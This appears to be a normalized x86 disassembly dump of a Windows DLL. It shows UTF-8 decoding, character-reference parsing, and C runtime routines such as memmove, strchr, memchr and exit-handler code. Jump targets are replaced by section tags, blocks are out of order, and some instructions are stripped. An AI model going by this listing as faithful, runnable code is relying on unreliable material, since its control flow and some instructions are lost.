mov eax [ ebp - 0x4 ]
movzx eax [ eax + ecx ]
shld edi ebx 0x8
cdq
shl ebx 0x8
or edx edi
inc ecx
or ebx eax
mov [ ebp - 0xc ] edx
cmp ecx [ ebp - 0x8 ]
jl r-xdata
sub_100776f0
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ esi ]
mov al [ ecx ]
push ebx
xor ebx ebx
xor dl dl
push edi
mov [ ebp - 0x4 ] ebx
cmp al 0x80
jae r-xdata
cmp al 0xc0
jb r-xdata
mov [ esi + 0x10 ] 0x1
or dl 0xff
jmp r-xdata
mov ebx 0x1
mov [ esi + 0x10 ] ebx
cmp al 0xe0
jae r-xdata
and al dl
movzx eax al
cdq
mov [ ebp - 0x8 ] edx
mov edx [ esi + 0x10 ]
mov edi eax
mov eax [ esi + 0x8 ]
add edx ecx
cmp edx eax
jbe r-xdata
mov ecx 0x1
cmp [ esi + 0x10 ] ecx
jle r-xdata
sub eax ecx
mov [ esi + 0x10 ] eax
push 0x1
mov eax esi
call sub_10077670
mov ebx 0x1
add esp 0x4
mov [ ebp - 0x4 ] ebx
cmp al 0xf0
jae r-xdata
mov [ esi + 0x10 ] 0x2
mov dl 0x1f
cmp al 0xc2
jae r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
ja r-xdata
jmp r-xdata
cmp al 0xf5
jae r-xdata
mov [ esi + 0x10 ] 0x3
mov dl 0xf
jmp r-xdata
mov ebx 0x1
jmp r-xdata
push 0x0
mov eax esi
call sub_10077670
add esp 0x4
mov eax 0xfffd
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
jb r-xdata
mov eax [ esi ]
mov al [ eax + ecx ]
lea edx [ eax + 0x80 ]
cmp dl 0x3f
ja r-xdata
cmp al 0xf8
jae r-xdata
mov [ esi + 0x10 ] 0x4
mov dl 0x7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
cmp edi 0x10ffff
ja r-xdata
mov [ esi + 0x10 ] ecx
mov ebx 0x1
mov ebx [ ebp - 0x8 ]
movzx eax al
shld ebx edi 0x6
and eax 0xffffff7f
cdq
shl edi 0x6
or edx ebx
inc ecx
or edi eax
mov [ ebp - 0x8 ] edx
cmp ecx [ esi + 0x10 ]
jl r-xdata
cmp al 0xfc
jae r-xdata
mov [ esi + 0x10 ] 0x5
mov ebx 0x1
jmp r-xdata
cmp edi 0x1
jl r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
cmp al 0xfe
jae r-xdata
mov [ esi + 0x10 ] 0x6
mov ebx 0x1
jmp r-xdata
cmp edi 0xb
je r-xdata
cmp edi 0x8
jle r-xdata
mov [ esi + 0x10 ] 0x7
mov ebx 0x1
jmp r-xdata
cmp edi 0xe
jl r-xdata
cmp edi 0x7f
jl r-xdata
cmp edi 0x1f
jle r-xdata
cmp edi 0xfdd0
jl r-xdata
cmp edi 0x9f
jle r-xdata
mov eax edi
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp edi 0xfdef
jle r-xdata
cmp eax 0xffff
jne r-xdata
cmp edi 0xd
jne r-xdata
mov [ esi + 0xc ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
jne r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x10 ]
add eax ecx
cmp eax [ esi + 0x8 ]
jae r-xdata
mov eax 0xa
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0xa
jne r-xdata
inc ecx
inc [ esi + 0x1c ]
mov [ esi ] ecx
sub_100778d0
push ebp
mov ebp esp
push esi
push eax
call sub_10043670
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10020760
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ esi ] edx
cdq
add esp 0x8
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
sub_10077910
push ebp
mov ebp esp
sub esp 0x8
push esi
push ebx
call sub_1002afa0
xor esi esi
push ebx
mov [ ebp - 0x4 ] esi
call sub_100081a0
add esp 0x8
cmp eax 0x78
je r-xdata
push ebx
mov [ ebp - 0x4 ] 0x1
call sub_1002afa0
push ebx
call sub_100081a0
mov esi [ ebp - 0x4 ]
add esp 0x8
cmp eax 0x58
jne r-xdata
test esi esi
je r-xdata
mov eax ecx
jmp r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10043670
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_1000e3b0
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0xffffffff
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10020760
add esp 0x8
mov [ esi ] 0x3
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
push edi
xor edi edi
neg esi
sbb esi esi
and esi 0x6
mov [ ebp - 0x8 ] 0x1
add esi 0xa
lea ebx [ ebx ]
add eax 0xffffffc9
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
push ebx
call sub_100081a0
add esp 0x4
cmp eax 0x3b
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_1002afa0
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_10043670
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
imul edi esi
push ebx
add edi eax
call sub_1002afa0
push ebx
call sub_100081a0
lea ecx [ eax - 0x30 ]
add esp 0x8
cmp ecx 0x9
ja r-xdata
mov ecx [ ecx * 8 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp ecx 0xffffffff
je r-xdata
mov eax [ ecx * 8 + r--data ]
inc ecx
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x8 ] 0x0
jmp r-xdata
push esi
push ebx
call sub_10020760
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x4
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
add eax 0xffffffc9
cmp edi 0xd800
jl r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10043670
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp eax edi
je r-xdata
xor ecx ecx
xor eax eax
cmp edi 0x10ffff
jle r-xdata
cmp edi 0xdfff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] eax
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10020760
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
push edi
call sub_10028540
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_10043670
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
push 0x5
push ebx
call sub_100778d0
add esp 0xc
mov [ ebp - 0x8 ] 0x0
cmp edi 0xb
jne r-xdata
mov edx [ ebp + 0xc ]
pop edi
mov [ edx ] 0xfffd
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10020760
mov eax edi
cdq
add esp 0x8
mov [ esi ] 0x5
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
mov eax [ ebp + 0xc ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_10077b50
push esi
push edi
xor edi edi
xor eax eax
jmp r-xdata
mov ecx [ eax + r--data ]
lea esi [ eax + r--data ]
mov eax [ esi + 0x4 ]
push 0x1
push eax
push ecx
push ebx
call sub_10003440
add esp 0x10
test eax eax
jne r-xdata
pop edi
mov eax esi
pop esi
retn
inc edi
mov eax edi
shl eax 0x4
cmp [ eax + r--data ] 0xffffffff
jne r-xdata
pop edi
xor eax eax
pop esi
retn
sub_10077ba0
push ebp
mov ebp esp
push ecx
push esi
push ebx
call sub_10015610
mov esi eax
mov [ ebp - 0x4 ] esi
cmp eax 0x41
jl r-xdata
cmp eax 0x7a
jle r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
cmp eax 0x5a
jle r-xdata
push ebx
call sub_1002afa0
jmp r-xdata
cmp eax 0x3b
jne r-xdata
push ebx
call sub_100081a0
add esp 0x8
cmp eax 0x61
jl r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push edi
push ebx
call sub_10015610
mov edx [ ebp + 0x8 ]
mov edi eax
push edx
sub edi esi
call sub_10043670
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10020760
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ esi ] 0x7
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edi
sub_10077c30
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov ebx edi
call sub_10077b50
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10077ba0
push edi
mov esi eax
call sub_1000e3b0
add esp 0x8
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
cmp [ eax + ecx - 0x1 ] 0x3b
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
mov ecx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] ecx
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
call sub_10043670
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
push edi
call sub_100081a0
add esp 0x4
cmp eax 0x3d
je r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
pop esi
mov [ eax + 0x4 ] edx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push ebx
push edi
call sub_10020760
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add esp 0x8
mov [ ebx ] 0x6
mov [ ebx + 0x18 ] edx
mov [ ebx + 0x1c ] eax
push edi
call sub_1000e3b0
add esp 0x4
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push eax
call sub_1006a30b
add esp 0x4
test eax eax
je r-xdata
sub_10077d10
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10077d94 ]
jmp [ ecx * 4 + jump_table_10077e14 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10077e80 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1007801c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10077f20 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007801c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_10077e80 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
push edi
mov eax esi
and eax 0xf
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1007801c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10077e80 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10077e80 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10077e80 ]
mov edx 0x10
sub edx eax
sub ecx edx
push ecx
mov eax edx
mov ecx eax
and ecx 0x3
je r-xdata
mov edx ecx
and ecx 0x7f
shr edx 0x7
je r-xdata
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007801c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007801c ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007801c ]
shr eax 0x2
je r-xdata
mov dl [ esi ]
mov [ edi ] dl
inc esi
inc edi
dec ecx
jne r-xdata
test ecx ecx
je r-xdata
jmp r-xdata
pop ecx
jmp r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec eax
jne r-xdata
pop eax
pop esi
pop edi
pop ebp
retn
mov edx ecx
shr edx 0x4
test edx edx
je r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec edx
jne r-xdata
and ecx 0xf
je r-xdata
lea ebx [ ebx ]
mov eax ecx
shr ecx 0x2
je r-xdata
movdqa xmm0 [ esi ]
movdqa [ edi ] xmm0
lea esi [ esi + 0x10 ]
lea edi [ edi + 0x10 ]
dec edx
jne r-xdata
mov ecx eax
and ecx 0x3
je r-xdata
mov edx [ esi ]
mov [ edi ] edx
lea esi [ esi + 0x4 ]
lea edi [ edi + 0x4 ]
dec ecx
jne r-xdata
mov al [ esi ]
mov [ edi ] al
inc esi
inc edi
dec ecx
jne r-xdata
sub_10078071
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_100261d5
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10020709
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10020709
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_10078168
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10064c8e
call sub_100616b5
push eax
call sub_100357e8
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x54 ]
mov [ eax + 0x54 ] edx
mov edx [ ecx + 0x58 ]
mov [ eax + 0x58 ] edx
mov edx [ ecx + 0x4 ]
push ecx
mov [ eax + 0x4 ] edx
call sub_10023671
mov esi [ ebp + 0x8 ]
push esi
call sub_100616b5
push eax
call sub_10028dc2
test eax eax
jne r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call [ ExitThread@IAT ]
call sub_10078127
sub_100781cd
push 0x20
push r--data
call sub_10078b50
push 0x8
call sub_1003938d
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100782f8
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_10078b95
retn
mov [ rw-data ] 0x1
push 0x8
call sub_1003e989
pop ecx
push [ ebp + 0x8 ]
call sub_10017dcd
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_10042f06
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_10042f06
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_10078320
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_100783e0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1007848d
push 0xc
push r--data
call sub_10078b50
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10032ea0
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_10066fab
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_10066fab
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10032ea0
push edi
push 0x0
push ebx
call sub_10066fab
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_10078b95
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
sub_10078583
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] eax
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
leave
retn
push esi
call sub_10078ac0
pop ecx
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0x49
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] ecx
cmp eax ecx
ja r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
mov [ ebp - 0x1c ] eax
sub_10078600
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x80
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_10078684 ]
jmp [ ecx * 4 + jump_table_10078704 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_10078770 ]
jmp r-xdata
jmp [ ecx * 4 + jump_table_1007890c ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_10078810 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1007890c ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
